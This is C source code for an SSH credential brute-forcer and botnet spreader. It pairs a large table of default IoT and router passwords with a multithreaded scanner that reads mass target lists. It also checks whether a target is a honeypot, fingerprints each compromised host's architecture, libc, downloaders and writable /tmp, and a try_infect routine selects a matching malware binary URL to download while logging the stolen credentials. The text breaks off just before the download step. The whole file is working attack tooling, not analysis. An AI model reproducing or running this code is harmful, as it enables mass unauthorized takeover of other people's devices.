#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#if defined(__GNUC__) && (__GNUC__ < 5) && !defined(__clang__)
#define atomic_int volatile int
#define atomic_fetch_add(ptr, val) __atomic_fetch_add((ptr), (val), __ATOMIC_SEQ_CST)
#define atomic_fetch_sub(ptr, val) __atomic_fetch_sub((ptr), (val), __ATOMIC_SEQ_CST)
#define atomic_load(ptr) __atomic_load_n((ptr), __ATOMIC_SEQ_CST)
#define atomic_store(ptr, val) __atomic_store_n((ptr), (val), __ATOMIC_SEQ_CST)
#else
#include <stdatomic.h>
#endif
#include <time.h>
#include <ctype.h>
#include <sys/resource.h>
#include <semaphore.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include "rawssh.h"

#define C_RESET "\033[0m"
#define C_BOLD "\033[1m"
#define C_BLUE "\033[94m"
#define C_GREEN "\033[92m"
#define C_YELLOW "\033[93m"
#define C_WHITE "\033[97m"
#define C_GRAY "\033[90m"
#define C_ORANGE "\033[38;5;208m"
#define C_RED "\033[91m"
#define C_CYAN "\033[96m"
#define CLEAR_SCREEN "\033[2J\033[H"
#define HIDE_CURSOR "\033[?25l"
#define SHOW_CURSOR "\033[?25h"

#define AUTH_PER_CONN 100

typedef struct {
    const char *u;
    const char *p;
} Cred;

static const Cred CREDS[] = {
    {"root", "root"},
    {"root", "admin"},
    {"root", "1234"},
    {"root", "password"},
    {"admin", "admin"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "password"},
    {"admin", "default"},
    {"ubnt", "ubnt"},
    {"pi", "raspberry"},
    {"pi", "pi"},
    {"pi", "banana"},
    {"banana", "pi"},
    {"raspberry", "pi"},
    {"vagrant", "vagrant"},
    {"user", "user"},
    {"test", "test"},
    {"guest", "guest"},
    {"support", "support"},
    {"12345", "12345"},
    {"admin", ""},
    {"admin", "1111111"},
    {"admin", "12345678"},
    {"admin", "2601hx"},
    {"admin", "7ujMko0admin"},
    {"admin", "88888888"},
    {"admin", "admin1234"},
    {"admin", "admin@123"},
    {"admin", "admin123"},
    {"Admin", "Admin"},
    {"admin", "adminpass"},
    {"admin", "adtran!"},
    {"admin", "aquario"},
    {"admin", "BrAhMoS@15"},
    {"admin", "firetide"},
    {"admin", "GeNeXiS@19"},
    {"admin", "h@32LuyD"},
    {"admin", "instar"},
    {"Administrator", "admin"},
    {"admin", "meinsm"},
    {"admin", "root"},
    {"admin", "samsung"},
    {"admin", "service"},
    {"admin", "VnT3ch@dm1n"},
    {"root", ""},
    {"root", "1001chin"},
    {"root", "1111"},
    {"root", "123456"},
    {"root", "12345"},
    {"root", "1234horses"},
    {"root", "20080826"},
    {"root", "2011vsta"},
    {"root", "3ep5w2u"},
    {"root", "54321"},
    {"root", "5up"},
    {"root", "666666"},
    {"root", "/*6.=_ja"},
    {"root", "7ujMko0admin"},
    {"root", "7ujMko0vizxv"},
    {"root", "888888"},
    {"root", "a1sev5y7c39k"},
    {"root", "adminpass"},
    {"root", "admintelecom1"},
    {"root", "alitvadmin"},
    {"root", "anko"},
    {"root", "antslq"},
    {"root", "arris"},
    {"root", "blender"},
    {"root", "default"},
    {"root", "dreambox"},
    {"root", "dropper"},
    {"root", "e2008jl"},
    {"root", "Fireitup"},
    {"root", "founder88"},
    {"root", "GM8182"},
    {"root", "grouter"},
    {"root", "hg2x0"},
    {"root", "hi3518"},
    {"root", "hipc3518"},
    {"root", "hkipc2016"},
    {"root", "hslwificam"},
    {"root", "huigu309"},
    {"root", "hunt5759"},
    {"root", "icatch99"},
    {"root", "ipc71a"},
    {"root", "ipcam"},
    {"root", "ipcam_rt5350"},
    {"root", "IPCam@sw"},
    {"root", "juantech"},
    {"root", "jvbzd"},
    {"root", "klv1234"},
    {"root", "klv123"},
    {"root", "LSiuY7pOmZG2s"},
    {"root", "oelinux123"},
    {"root", "pass"},
    {"root", "Pon521"},
    {"root", "root123"},
    {"root", "root621"},
    {"root", "solokey"},
    {"root", "star123"},
    {"root", "svgodie"},
    {"root", "system"},
    {"root", "t0talc0ntr0l4!"},
    {"root", "taZz@01"},
    {"root", "taZz@23495859"},
    {"root", "telecomadmin"},
    {"root", "telnet"},
    {"root", "tl789"},
    {"root", "tsgoingon"},
    {"root", "ttnet"},
    {"root", "uFwfBht5"},
    {"root", "unisheen"},
    {"root", "user"},
    {"root", "vizxv"},
    {"root", "wabjtam"},
    {"root", "xc12345"},
    {"root", "xc3511"},
    {"root", "xirtam"},
    {"root", "xmhdipc"},
    {"root", "zhongxing"},
    {"root", "zlxx."},
    {"root", "zmHDc0m"},
    {"root", "zsun1188"},
    {"root", "Zte521"},
    {"root", "Zxic521"},
    {"root", "zyad1234"},
    {"default", "12345"},
    {"default", "1cDuLJ7c"},
    {"default", "antslq"},
    {"default", "default"},
    {"default", "lJwpbo6"},
    {"default", "OxhlwSG8"},
    {"default", "S2fGqNFs"},
    {"default", "tlJwpbo6"},
    {"default", "tluafed"},
    {"guest", "123456"},
    {"guest", "12345"},
    {"user", "12345"},
    {"bin", "bin"},
    {"boards", "boards123"},
    {"cht", "chtsgpon"},
    {"cisco", "cisco123"},
    {"cisco", "cisco"},
    {"CUAdmin", "CUAdmin"},
    {"daemon", "daemon"},
    {"de", "S2"},
    {"draytek", "1234"},
    {"e8ehomeasb", "e8ehomeasb"},
    {"e8ehome", "e8ehome"},
    {"e8telnet", "e8telnet"},
    {"Epadmin", "adminEp"},
    {"epuser", "epuser"},
    {"ftp", "ftp"},
    {"ftp", "video"},
    {"haver", "haver123"},
    {"hikvision", "hikvision"},
    {"installer", "fiberinst"},
    {"nobody", "nobody"},
    {"oltuser", "olt!pass"},
    {"on_support", "fh1234"},
    {"onuser", "onuser123"},
    {"service", "serviceC0mp!"},
    {"super", "sp-admin"},
    {"super", "xJ4pCYeW"},
    {"support", "1234"},
    {"supportadmin", "supportadmin"},
    {"support_gp", "tplinkgp"},
    {"tech", "tech"},
    {"telecomadmin", "ADMIN"},
    {"telecomadmin", "admintelecom"},
    {"telecomadmin", "nE7jA%5m"},
    {"telnetadmin", "telnetadmin"},
    {"telnet", "telnet"},
    {"vstarcam2015", "20150602"},
    {"vstarcam2017", "20170912"},
};

#define NCREDS (sizeof(CREDS) / sizeof(CREDS[0]))

typedef struct {
    char ip[48];
    int port;
} Target;

typedef struct {
    char url[512];
    char arch[24];
} BinEntry;

typedef struct {
    char ip[48];
    int port;
    char user[32];
    char pass[32];
    int hp;
    char arch[32];
    char endian[4];
    char mips_ver[16];
    char kernel[128];
    char libc[16];
    char mips_class[16];
    char bin_suffix[24];
    int uid;
    int has_wget;
    int has_curl;
    int has_printf;
    int has_chmod;
    int tmp_writable;
    char info[512];
} Result;

static Target *g_targets;
static int g_ntargets;
static Result *g_results;
static int g_nresults;
static int g_rescap;
static pthread_mutex_t g_resmtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_filemtx = PTHREAD_MUTEX_INITIALIZER;

static atomic_int G_tested;
static atomic_int G_found;
static atomic_int G_real;
static atomic_int G_hp;
static atomic_int G_done;
static atomic_int G_active;
static atomic_int G_next;
static atomic_int G_tcp_ok;
static atomic_int G_tcp_err;
static atomic_int G_ssh_ok;
static atomic_int G_ssh_err;
static atomic_int G_wrong;
static atomic_int G_sess_err;
static atomic_int G_ssh_timeout;
static atomic_int G_ssh_tcperr;
static atomic_int G_ssh_hsfail;
static atomic_int G_ssh_proto;
static atomic_int G_ssh_other;
static atomic_int G_ssh_closed;
static atomic_int G_infected;
static atomic_int G_infect_fail;
static pthread_mutex_t g_logmtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_infectlogmtx = PTHREAD_MUTEX_INITIALIZER;

static int g_threads = 200;
static int g_timeout = 5;
static int g_maxconn = 1000;
static sem_t g_sem;
static time_t g_start;
static atomic_int g_run = 1;
static char g_nic[64] = {0};
static int g_infect = 0;
static BinEntry *g_bins = NULL;
static int g_nbins = 0;

static void raise_limits() {
    struct rlimit r = {1048576, 1048576};
    setrlimit(RLIMIT_NOFILE, &r);
}

static void detect_nic() {
    if (g_nic[0])
        return;

    FILE *fp = fopen("/proc/net/dev", "r");
    if (!fp)
        return;

    char line[256];

    if (!fgets(line, sizeof(line), fp)) {
        fclose(fp);
        return;
    }
    if (!fgets(line, sizeof(line), fp)) {
        fclose(fp);
        return;
    }

    while (fgets(line, sizeof(line), fp)) {
        char *p = line;
        while (*p && isspace(*p))
            p++;
        char *c = strchr(p, ':');
        if (!c)
            continue;
        *c = 0;
        if (strcmp(p, "lo") == 0)
            continue;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
            continue;
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, p, IFNAMSIZ - 1);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (ifr.ifr_flags & IFF_UP) {
                strncpy(g_nic, p, sizeof(g_nic) - 1);
                close(sock);
                fclose(fp);
                return;
            }
        }
        close(sock);
    }
    fclose(fp);
}

static int load_targets(const char *f) {
    FILE *fp = fopen(f, "r");
    if (!fp)
        return 0;

    int cap = 500000;
    g_targets = malloc(cap * sizeof(Target));
    char line[128];

    while (fgets(line, sizeof(line), fp)) {
        char *p = line;
        while (*p && isspace(*p))
            p++;
        if (!*p || *p == '#')
            continue;
        char *e = p + strlen(p) - 1;
        while (e > p && isspace(*e))
            *e-- = 0;
        if (g_ntargets >= cap) {
            cap *= 2;
            g_targets = realloc(g_targets, cap * sizeof(Target));
        }
        char *c = strrchr(p, ':');
        if (c) {
            *c = 0;
            strncpy(g_targets[g_ntargets].ip, p, 47);
            g_targets[g_ntargets].port = atoi(c + 1);
        } else {
            strncpy(g_targets[g_ntargets].ip, p, 47);
            g_targets[g_ntargets].port = 22;
        }
        g_ntargets++;
    }
    fclose(fp);
    return g_ntargets;
}

static int ssh_exec_cmd(rawssh_session *ses, const char *cmd, char *out, int sz) {
    rawssh_channel *c = rawssh_channel_open(ses);
    if (!c)
        return 0;
    if (rawssh_channel_exec(c, cmd) != RAWSSH_OK) {
        rawssh_channel_close(c);
        rawssh_channel_free(c);
        return 0;
    }
    int t = 0;
    int r;
    char buf[512];
    for (int i = 0; i < 80; i++) {
        r = rawssh_channel_read(c, buf, sizeof(buf) - 1);
        if (r > 0 && t + r < sz) {
            memcpy(out + t, buf, r);
            t += r;
        } else if (r <= 0) {
            break;
        }
    }
    out[t] = 0;
    rawssh_channel_close(c);
    rawssh_channel_free(c);
    return t;
}

static int check_hp(rawssh_session *s) {
    char buf[256] = {0};
    int r;

    r = ssh_exec_cmd(s, "ls -la /dev/null 2>/dev/null", buf, sizeof(buf));
    if (r <= 0)
        return 1;

    char *p = buf;
    while (*p && ((unsigned char)*p <= 0x20))
        p++;
    if (*p != 'c')
        return 1;

    memset(buf, 0, sizeof(buf));
    r = ssh_exec_cmd(s, "TERM=xterm clear 2>/dev/null", buf, sizeof(buf));
    if (r <= 0)
        return 1;

    for (int i = 0; i < r; i++) {
        if (buf[i] == 0x1b)
            return 0;
    }
    return 1;
}

static void determine_mips_class(Result *r) {
    memset(r->mips_class, 0, sizeof(r->mips_class));

    if (strncmp(r->arch, "mips", 4) != 0)
        return;

    if (r->mips_ver[0] && strcmp(r->mips_ver, "-") != 0) {
        if (strcmp(r->mips_ver, "mips32") == 0 || strcmp(r->mips_ver, "mips34") == 0) {
            strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
            return;
        }
    }

    int major = 0, minor = 0, patch = 0;
    if (r->kernel[0])
        sscanf(r->kernel, "%d.%d.%d", &major, &minor, &patch);

    if (r->libc[0] && strcmp(r->libc, "uclibc") == 0) {
        if (major > 0 && (major < 2 || (major == 2 && minor < 6) || (major == 2 && minor == 6 && patch < 18)))
            strncpy(r->mips_class, "mips-oldest", sizeof(r->mips_class) - 1);
        else
            strncpy(r->mips_class, "mips-old", sizeof(r->mips_class) - 1);
    } else if (r->libc[0] && strcmp(r->libc, "musl") == 0) {
        strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
    } else {
        if (major > 0 && (major < 3 || (major == 3 && minor < 2)))
            strncpy(r->mips_class, "mips-old", sizeof(r->mips_class) - 1);
        else
            strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
    }
}

static void determine_bin_suffix(Result *r) {
    memset(r->bin_suffix, 0, sizeof(r->bin_suffix));

    int major = 0, minor = 0, patch = 0;
    if (r->kernel[0])
        sscanf(r->kernel, "%d.%d.%d", &major, &minor, &patch);

    /* x86_64 / amd64 */
    if (strcmp(r->arch, "x86_64") == 0 || strcmp(r->arch, "amd64") == 0) {
        strncpy(r->bin_suffix, "x86_64", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* x86 32-bit */
    if (strcmp(r->arch, "i686") == 0 || strcmp(r->arch, "i586") == 0 ||
        strcmp(r->arch, "i486") == 0 || strcmp(r->arch, "i386") == 0) {
        strncpy(r->bin_suffix, "x86", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* aarch64 / arm64 */
    if (strcmp(r->arch, "aarch64") == 0 || strcmp(r->arch, "aarch64_be") == 0) {
        strncpy(r->bin_suffix, "arm64", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* ARM big-endian */
    if (strcmp(r->arch, "armeb") == 0) {
        strncpy(r->bin_suffix, "armeb", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* ARM little-endian (armv7l, armv6l, armv5tel, arm, etc) */
    if (strncmp(r->arch, "arm", 3) == 0 && strcmp(r->endian, "LE") == 0) {
        /* armv7l with hard-float -> armhf, else arm */
        if (strncmp(r->arch, "armv7", 5) == 0 || strncmp(r->arch, "armv6", 5) == 0) {
            /* Check if hard-float: kernels >= 3.x on armv7/v6 usually are hf */
            if (major >= 3)
                strncpy(r->bin_suffix, "armhf", sizeof(r->bin_suffix) - 1);
            else
                strncpy(r->bin_suffix, "arm", sizeof(r->bin_suffix) - 1);
        } else {
            strncpy(r->bin_suffix, "arm", sizeof(r->bin_suffix) - 1);
        }
        return;
    }

    /* MIPS64 big-endian */
    if (strcmp(r->arch, "mips64") == 0) {
        strncpy(r->bin_suffix, "mips64", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* MIPS big-endian */
    if (strcmp(r->arch, "mips") == 0 && strcmp(r->endian, "BE") == 0) {
        if (r->libc[0] && strcmp(r->libc, "uclibc") == 0) {
            if (major > 0 && (major < 2 || (major == 2 && minor < 6) || (major == 2 && minor == 6 && patch < 18)))
                strncpy(r->bin_suffix, "mips_oldest", sizeof(r->bin_suffix) - 1);
            else
                strncpy(r->bin_suffix, "mips_old", sizeof(r->bin_suffix) - 1);
        } else if (r->libc[0] && strcmp(r->libc, "musl") == 0) {
            strncpy(r->bin_suffix, "mips", sizeof(r->bin_suffix) - 1);
        } else {
            if (major > 0 && (major < 3 || (major == 3 && minor < 2)))
                strncpy(r->bin_suffix, "mips_old", sizeof(r->bin_suffix) - 1);
            else
                strncpy(r->bin_suffix, "mips", sizeof(r->bin_suffix) - 1);
        }
        return;
    }

    /* MIPS little-endian (mipsel) */
    if ((strcmp(r->arch, "mipsel") == 0 || strcmp(r->arch, "mips") == 0) && strcmp(r->endian, "LE") == 0) {
        if (r->libc[0] && strcmp(r->libc, "uclibc") == 0) {
            strncpy(r->bin_suffix, "mipsel_old", sizeof(r->bin_suffix) - 1);
        } else if (r->libc[0] && strcmp(r->libc, "musl") == 0) {
            strncpy(r->bin_suffix, "mipsel", sizeof(r->bin_suffix) - 1);
        } else {
            if (major > 0 && (major < 3 || (major == 3 && minor < 2)))
                strncpy(r->bin_suffix, "mipsel_old", sizeof(r->bin_suffix) - 1);
            else
                strncpy(r->bin_suffix, "mipsel", sizeof(r->bin_suffix) - 1);
        }
        return;
    }

    /* PowerPC */
    if (strcmp(r->arch, "ppc") == 0 || strcmp(r->arch, "powerpc") == 0) {
        strncpy(r->bin_suffix, "ppc", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* SH4 */
    if (strcmp(r->arch, "sh4") == 0 || strcmp(r->arch, "sh4a") == 0) {
        strncpy(r->bin_suffix, "sh4", sizeof(r->bin_suffix) - 1);
        return;
    }

    /* Fallback: use arch as suffix */
    strncpy(r->bin_suffix, r->arch, sizeof(r->bin_suffix) - 1);
}


/* Forward declaration — defined later, needed here for endian debug logging */
static void log_infect(const char *ip, int port, const char *fmt, ...);

static void get_info(rawssh_session *s, Result *r) {
    char buf[512] = {0};

    /* --- 1. arch (uname -m) --- */
    ssh_exec_cmd(s, "uname -m", buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) { if (buf[i] == '\n' || buf[i] == '\r') buf[i] = 0; }
    strncpy(r->arch, buf, sizeof(r->arch) - 1);

    /* --- 2. uid --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "id -u", buf, sizeof(buf));
    r->uid = atoi(buf);

    /* --- 3. kernel version --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "uname -r", buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) { if (buf[i] == '\n' || buf[i] == '\r') buf[i] = 0; }
    strncpy(r->kernel, buf, sizeof(r->kernel) - 1);

    /* --- 4. endianness detection (read ELF header byte 5 = EI_DATA) --- */
    r->endian[0] = 0;
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s,
        "for f in /bin/ls /bin/cat /bin/sh /bin/busybox /proc/self/exe /sbin/init /usr/bin/env; do "
        "[ -r \"$f\" ] && { b=$(dd if=\"$f\" bs=1 skip=5 count=1 2>/dev/null); "
        "[ \"$b\" = \"$(echo -e '\\x01')\" ] && echo LE || echo BE; break; }; done",
        buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) { if (buf[i] == '\n' || buf[i] == '\r') buf[i] = 0; }
    log_infect(r->ip, r->port, "[ENDIAN] result: '%s'", buf);
    if (strstr(buf, "LE"))
        strcpy(r->endian, "LE");
    else if (strstr(buf, "BE"))
        strcpy(r->endian, "BE");
    else
        strcpy(r->endian, "LE"); /* fallback */

    /* --- 5. MIPS version from cpuinfo --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "grep -oE 'mips3.' /proc/cpuinfo 2>/dev/null|head -1", buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) { if (buf[i] == '\n' || buf[i] == '\r') buf[i] = 0; }
    if (buf[0])
        strncpy(r->mips_ver, buf, sizeof(r->mips_ver) - 1);
    else
        strcpy(r->mips_ver, "-");

    /* --- 6. libc detection --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "ls /lib/libuClibc* 2>/dev/null&&echo uclibc||ls /lib/ld-musl* 2>/dev/null&&echo musl||echo glibc", buf, sizeof(buf));
    for (int i = 0; buf[i]; i++) { if (buf[i] == '\n' || buf[i] == '\r') buf[i] = 0; }
    if (strstr(buf, "uclibc"))
        strcpy(r->libc, "uclibc");
    else if (strstr(buf, "musl"))
        strcpy(r->libc, "musl");
    else
        strcpy(r->libc, "glibc");

    /* --- 7. tool availability --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "which wget 2>/dev/null&&echo W||echo N", buf, sizeof(buf));
    r->has_wget = (strstr(buf, "W") != NULL || (buf[0] == '/' )) ? 1 : 0;

    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "which curl 2>/dev/null&&echo W||echo N", buf, sizeof(buf));
    r->has_curl = (strstr(buf, "W") != NULL || (buf[0] == '/')) ? 1 : 0;

    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "which printf 2>/dev/null&&echo W||echo N", buf, sizeof(buf));
    r->has_printf = (strstr(buf, "W") != NULL || (buf[0] == '/')) ? 1 : 0;

    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "which chmod 2>/dev/null&&echo W||echo N", buf, sizeof(buf));
    r->has_chmod = (strstr(buf, "W") != NULL || (buf[0] == '/')) ? 1 : 0;

    /* --- 8. /tmp writable --- */
    memset(buf, 0, sizeof(buf));
    ssh_exec_cmd(s, "[ -w /tmp ]&&echo W||echo N", buf, sizeof(buf));
    r->tmp_writable = (buf[0] == 'W') ? 1 : 0;

    /* --- Derive mips class and binary suffix --- */
    determine_mips_class(r);
    determine_bin_suffix(r);

    /* Build info string */
    snprintf(r->info, sizeof(r->info), "ARCH:%s|UID:%d|ENDIAN:%s|MIPS:%s|KERNEL:%s|LIBC:%s|CLASS:%s|BIN:%s|WGET:%s|CURL:%s|PRINTF:%s|CHMOD:%s|TMP:%s",
             r->arch,
             r->uid,
             r->endian,
             r->mips_ver,
             r->kernel,
             r->libc,
             r->mips_class[0] ? r->mips_class : "-",
             r->bin_suffix[0] ? r->bin_suffix : "-",
             r->has_wget ? "YES" : "NO",
             r->has_curl ? "YES" : "NO",
             r->has_printf ? "YES" : "NO",
             r->has_chmod ? "YES" : "NO",
             r->tmp_writable ? "YES" : "NO");
}

static int load_binaries(const char *path) {
    FILE *fp = fopen(path, "r");
    if (!fp)
        return 0;
    int cap = 64;
    g_bins = malloc(cap * sizeof(BinEntry));
    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        char *p = line;
        while (*p && isspace(*p)) p++;
        if (!*p || *p == '#') continue;
        /* Format: "URL" - "arch" */
        if (*p != '"') continue;
        p++;
        char *url_end = strchr(p, '"');
        if (!url_end) continue;
        *url_end = 0;
        char *url_str = p;
        p = url_end + 1;
        /* skip spaces and dash */
        while (*p && (*p == ' ' || *p == '-')) p++;
        if (*p != '"') continue;
        p++;
        char *arch_end = strchr(p, '"');
        if (!arch_end) continue;
        *arch_end = 0;
        char *arch_str = p;
        if (g_nbins >= cap) {
            cap *= 2;
            g_bins = realloc(g_bins, cap * sizeof(BinEntry));
        }
        memset(&g_bins[g_nbins], 0, sizeof(BinEntry));
        strncpy(g_bins[g_nbins].url, url_str, sizeof(g_bins[g_nbins].url) - 1);
        strncpy(g_bins[g_nbins].arch, arch_str, sizeof(g_bins[g_nbins].arch) - 1);
        g_nbins++;
    }
    fclose(fp);
    return g_nbins;
}

static void log_infect(const char *ip, int port, const char *fmt, ...) {
    pthread_mutex_lock(&g_infectlogmtx);
    FILE *fp = fopen("logs_real_linuxes_busyboxes.txt", "a");
    if (fp) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] [%s:%d] ",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec, ip, port);
        va_list ap;
        va_start(ap, fmt);
        vfprintf(fp, fmt, ap);
        va_end(ap);
        fprintf(fp, "\n");
        fclose(fp);
    }
    pthread_mutex_unlock(&g_infectlogmtx);
}

/* Execute SSH command with full logging. Logs the raw terminal output as-is,
   exactly what the server prints — line by line, plain text. */
static int ssh_exec_logged(rawssh_session *ses, const char *cmd, char *out, int sz,
                           const char *ip, int port, const char *label) {
    struct timespec ts_start, ts_end;
    clock_gettime(CLOCK_MONOTONIC, &ts_start);

    log_infect(ip, port, "[%s] $ %s", label, cmd);

    rawssh_channel *c = rawssh_channel_open(ses);
    if (!c) {
        log_infect(ip, port, "[%s] ERROR: failed to open channel", label);
        return 0;
    }

    int exec_rc = rawssh_channel_exec(c, cmd);
    if (exec_rc != RAWSSH_OK) {
        log_infect(ip, port, "[%s] ERROR: exec failed rc=%d (%s)", label, exec_rc, rawssh_error_str(exec_rc));
        rawssh_channel_close(c);
        rawssh_channel_free(c);
        return 0;
    }

    int total = 0;
    int rd;
    char buf[512];
    int fast_zero = 0;   /* counts zero-reads that returned instantly (EOF) */
    int slow_zero = 0;   /* counts zero-reads from poll timeout (waiting for data) */

    for (int i = 0; i < 300; i++) {
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        rd = rawssh_channel_read(c, buf, sizeof(buf) - 1);
        clock_gettime(CLOCK_MONOTONIC, &t1);
        double read_ms = (t1.tv_sec - t0.tv_sec) * 1000.0 +
                         (t1.tv_nsec - t0.tv_nsec) / 1000000.0;

        if (rd > 0) {
            buf[rd] = 0;
            fast_zero = 0;
            slow_zero = 0;
            if (total + rd < sz) {
                memcpy(out + total, buf, rd);
                total += rd;
            }
        } else if (rd == 0) {
            if (read_ms < 50.0) {
                /* Returned 0 instantly → channel already received EOF/CLOSE.
                   No point in waiting further — command is done. */
                fast_zero++;
                if (fast_zero >= 2)
                    break;
            } else {
                /* Returned 0 after a long poll → command still running,
                   just no output yet (e.g. during sleep 2/3 in the command).
                   Keep waiting up to ~20 poll cycles. */
                fast_zero = 0;
                slow_zero++;
                if (slow_zero >= 20)
                    break;  /* safety limit */
            }
        } else {
            break;  /* negative = error */
        }
    }
    out[total] = 0;

    rawssh_channel_close(c);
    rawssh_channel_free(c);

    clock_gettime(CLOCK_MONOTONIC, &ts_end);
    double elapsed_ms = (ts_end.tv_sec - ts_start.tv_sec) * 1000.0 +
                        (ts_end.tv_nsec - ts_start.tv_nsec) / 1000000.0;

    /* Log raw output line by line, exactly what the terminal printed */
    if (total > 0) {
        char tmp[8192];
        int len = total < (int)sizeof(tmp) - 1 ? total : (int)sizeof(tmp) - 1;
        memcpy(tmp, out, len);
        tmp[len] = 0;
        char *line = tmp;
        char *nl;
        while ((nl = strchr(line, '\n')) != NULL) {
            *nl = 0;
            /* Strip trailing \r */
            int ll = (int)strlen(line);
            if (ll > 0 && line[ll - 1] == '\r') line[ll - 1] = 0;
            log_infect(ip, port, "[%s] | %s", label, line);
            line = nl + 1;
        }
        /* Last line without newline */
        if (*line) {
            int ll = (int)strlen(line);
            if (ll > 0 && line[ll - 1] == '\r') line[ll - 1] = 0;
            if (*line)
                log_infect(ip, port, "[%s] | %s", label, line);
        }
    } else {
        log_infect(ip, port, "[%s] (no output)", label);
    }

    log_infect(ip, port, "[%s] completed in %.0fms (%d bytes)", label, elapsed_ms, total);
    return total;
}

static void try_infect(rawssh_session *ses, Result *r) {
    if (!g_infect) return;
    if (r->hp != 0) return;
    if (g_nbins <= 0) return;

    log_infect(r->ip, r->port, "================================================================");
    log_infect(r->ip, r->port, "=== INFECT START ===");
    log_infect(r->ip, r->port, "Target: %s:%d", r->ip, r->port);
    log_infect(r->ip, r->port, "Credentials: user='%s' pass='%s'", r->user, r->pass);
    log_infect(r->ip, r->port, "Arch: '%s' | Endian: '%s' | Kernel: '%s' | Libc: '%s'",
               r->arch, r->endian, r->kernel, r->libc);
    log_infect(r->ip, r->port, "UID: %d (root=%s)", r->uid, r->uid == 0 ? "YES" : "NO");
    log_infect(r->ip, r->port, "Binary suffix detected: '%s'", r->bin_suffix[0] ? r->bin_suffix : "UNKNOWN");
    log_infect(r->ip, r->port, "MIPS class: '%s' | MIPS ver: '%s'",
               r->mips_class[0] ? r->mips_class : "-", r->mips_ver[0] ? r->mips_ver : "-");
    log_infect(r->ip, r->port, "Tools: wget=%s curl=%s chmod=%s printf=%s",
               r->has_wget ? "YES" : "NO", r->has_curl ? "YES" : "NO",
               r->has_chmod ? "YES" : "NO", r->has_printf ? "YES" : "NO");
    log_infect(r->ip, r->port, "/tmp writable: %s", r->tmp_writable ? "YES" : "NO");
    log_infect(r->ip, r->port, "Full sysinfo string: '%s'", r->info);
    log_infect(r->ip, r->port, "----------------------------------------------------------------");

    /* Need chmod */
    if (!r->has_chmod) {
        log_infect(r->ip, r->port, "ABORT: chmod not available, cannot make binary executable");
        log_infect(r->ip, r->port, "=== INFECT ABORTED (no chmod) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }

    /* Need wget or curl — also try busybox wget as last resort */
    if (!r->has_wget && !r->has_curl) {
        /* Some devices have busybox wget but `which` can't find it */
        char bbchk[128] = {0};
        ssh_exec_cmd(ses, "busybox wget --help 2>&1 | head -1 && echo BBWGET_YES || echo BBWGET_NO", bbchk, sizeof(bbchk));
        if (strstr(bbchk, "BBWGET_YES") || strstr(bbchk, "Usage") || strstr(bbchk, "wget")) {
            r->has_wget = 1;
            log_infect(r->ip, r->port, "  busybox wget detected as fallback downloader");
        } else {
            log_infect(r->ip, r->port, "ABORT: neither wget nor curl available, cannot download");
            log_infect(r->ip, r->port, "=== INFECT ABORTED (no downloader) ===");
            log_infect(r->ip, r->port, "================================================================");
            atomic_fetch_add(&G_infect_fail, 1);
            return;
        }
    }

    /* Need bin_suffix */
    if (!r->bin_suffix[0]) {
        log_infect(r->ip, r->port, "ABORT: could not determine binary suffix for arch '%s'", r->arch);
        log_infect(r->ip, r->port, "=== INFECT ABORTED (unknown arch) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }

    /* Find matching binary URL */
    log_infect(r->ip, r->port, "Searching binaries.txt for arch '%s'...", r->bin_suffix);
    const char *bin_url = NULL;
    for (int i = 0; i < g_nbins; i++) {
        log_infect(r->ip, r->port, "  Checking [%d] arch='%s' url='%s' -> %s",
                   i, g_bins[i].arch, g_bins[i].url,
                   strcmp(g_bins[i].arch, r->bin_suffix) == 0 ? "MATCH" : "no");
        if (strcmp(g_bins[i].arch, r->bin_suffix) == 0) {
            bin_url = g_bins[i].url;
            break;
        }
    }
    if (!bin_url) {
        log_infect(r->ip, r->port, "ABORT: no binary URL found matching arch suffix '%s'", r->bin_suffix);
        log_infect(r->ip, r->port, "=== INFECT ABORTED (no matching binary) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }
    log_infect(r->ip, r->port, "MATCHED binary URL: %s", bin_url);
    log_infect(r->ip, r->port, "----------------------------------------------------------------");

